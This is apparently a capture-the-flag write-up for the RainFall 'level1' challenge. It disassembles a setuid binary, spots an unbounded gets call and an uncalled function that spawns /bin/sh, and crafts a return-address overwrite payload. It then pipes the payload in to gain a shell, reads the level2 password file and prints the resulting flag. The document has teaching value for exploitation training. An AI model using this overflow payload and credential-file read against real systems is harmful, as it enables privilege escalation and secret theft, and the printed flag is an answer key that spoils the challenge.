# level1

## Hint

When we log into the machine as `level1`, we notice a binary:

```shell-session
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$ ./level1
000000000000
level1@RainFall:~$ ./level1
000000000000000000000000000000000000000000000000000000000000
level1@RainFall:~$ ./level1
0000000000000000000000000000000000000000000000000000000000000000
level1@RainFall:~$ ./level1
0000000000000000000000000000000000000000000000000000000000000000000000000000000
Segmentation fault (core dumped)
```


We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting since it seems to crash upon its input reaching a given length.

## gdb

### gets

```gdb
level1@RainFall:~$ gdb -q level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.2
```

Here, we can see a call to the function `gets`. This functions is notorious for its vulnerability since it does **not** check for the length of the string it is given to print.

That's assuredly the reason why the program crashes when the string reaches 80 chars of length.

### unused function

Since there isn't much we can glean from such a short binary, we can use the `info` command of gdb to learn more.

Typically, this would allow for the display of addresses of every function that went through the compilation process with `info functions`.

Furthermore, since the VM is tailored for easy BufferOverflows (no randomization of addresses, etc...), the address we get from that command is persistent between two executions of the program and is therefor very easily exploited.

As we launch the command we can see that there is a function that is neither of the system, nor the libc, and is not part of a DLL, the function `run`. This function has very clearly been compiled but hasn't been called in the main function.

If we use the `disas` command on that function identifier, we may see what that function does and maybe continue with our exploiting of the binary...

```gdb
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run                    <--- address and ident of uncalled function
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)    <---- parameter to system call
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

Now that we have an idea of what `run` does since we can see a call to `fwrite` and `system` we can inspect what exactly these function calls receive as parameters and see that the system call runs a shell.

Since the `suid` and extended permissions bits are set on the binary, it is clear that we could get the rights to the `level2` pass if we managed to reach that instruction.

# BO-ing

As said previously, the VM is very clearly set to be a playful sandbox for BufferOverflows. (BO) We can see that by a collection of settings that are deactivated that would make it much harder for us to exploit the binary in such a way.

So what is a BO anyway ? Wikipedia says the following:

> In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.

But what does "overwrites adjacent memory locations" mean ? It means that, at runtime,  if we insert the correct set of bytes over the buffer's boundaries, the execution will read these bytes instead of what they overwrote and may continue execution to an address that we shouldn't have been able to reach otherwise.

In practicality this means that, if we insert the address of the `run` function over the return address of the current function (`gets`), the RIP (Runtime Instruction Pointer) will make the code pointed to by that address automatically executed as if it were a legal region of the code in the binary.

In order to do that, we must:
1. Establish what is the length of the buffer used by the `gets `function.
2. Make it so the bytes that will be read by the RIP are well situated and are correctly overwriting the return address of the `gets` function.
3. Make it so these bytes form the absolute address of the `run` function. (0x08048444)
4. Take into account the endianness of the machine

So the first stage is rather try-and-error-based. We launch the program with an input that will make it barely segfault.

After some testing, and several segfaults, we notice that the program crashes with a SEGV once the input reaches a big enough length.

```shell-session
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$ ./level1
000000000000
level1@RainFall:~$ ./level1
000000000000000000000000000000000000000000000000000000000000
level1@RainFall:~$ ./level1
0000000000000000000000000000000000000000000000000000000000000000
level1@RainFall:~$ ./level1
000000000000000000000000000000000000000000000000000000000000000000000000000
level1@RainFall:~$ ./level1
0000000000000000000000000000000000000000000000000000000000000000000000000000
Illegal instruction (core dumped)
level1@RainFall:~$ ./level1
00000000000000000000000000000000000000000000000000000000000000000000000000000
Illegal instruction (core dumped)
level1@RainFall:~$ ./level1
000000000000000000000000000000000000000000000000000000000000000000000000000000
Segmentation fault (core dumped)
```

But we also noticed that with some lengths, the program crashes with an `Illegal Instruction` message instead of a SEGV. And we know that this message means that we are corrupting a return address, which is sending the code to where all those "illegal instructions" exist.

This means that we now know the length of the input needed for rewriting the return address of the function, we must now proceed to append the bytes representing the address of the `run` function to that input string in order to successfully jump the code of that function at runtime.

Lets create a malicious file containing a malicious input string.

# injectme

1. Create the shellcode by writing the wanted bytes into an input string we will feed to the `gets` function

```shell-session
λ rainfall42/level1/Ressources echo -n -e '0000000000000000000000000000000000000000000000000000000000000000000000000000\x44\x84\x04\x08' > injectme
```

2. Send the string to the VM over the Bridged Network with SCP

```gdb
 λ rainfall42/level1/Ressources scp -P 4242 injectme scp://level1@192.168.24.236//tmp
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 192.168.24.236:4242
level1@192.168.24.236's password:
injectme
```

3. Make a breakpoint to the desired address and feed the malicious input to the binary and see the executed halted as expected

```gdb
level1@RainFall:~$ gdb -q level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
(gdb) b *0x08048472
Breakpoint 1 at 0x8048472
(gdb) run < /tmp/injectme
Starting program: /home/user/level1/level1 < /tmp/injectme
Good... Wait what?

Breakpoint 1, 0x08048472 in run ()
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
=> 0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret

   (gdb) ni
0x08048479 in run ()
   (gdb) ni
0x0804847e in run ()
   (gdb) ni
0x0804847f in run ()
   (gdb) ni
0x00000000 in ?? ()
   (gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) ni

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
```

What we see here is the fact that GDB, as a wrapper to the binary, captures any signal sent to the process, including the SEGV. Stopping us from accessing the shell that the call to the `system` function would invoke.

But we may access it through the command line.

## pipe to new shell

```gdb
level1@RainFall:~$ cat /tmp/injectme | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Again, we see that the signal terminates the process immediately... but if we made it so STDIN stayed open, we should be able to communicate with the subprocess...

Lets use `cat -` to see if that works

# flag

```shell-session
level1@RainFall:~$ cat /tmp/injectme | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ cat /tmp/injectme - | ./level1

Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

^C
Segmentation fault (core dumped)
```
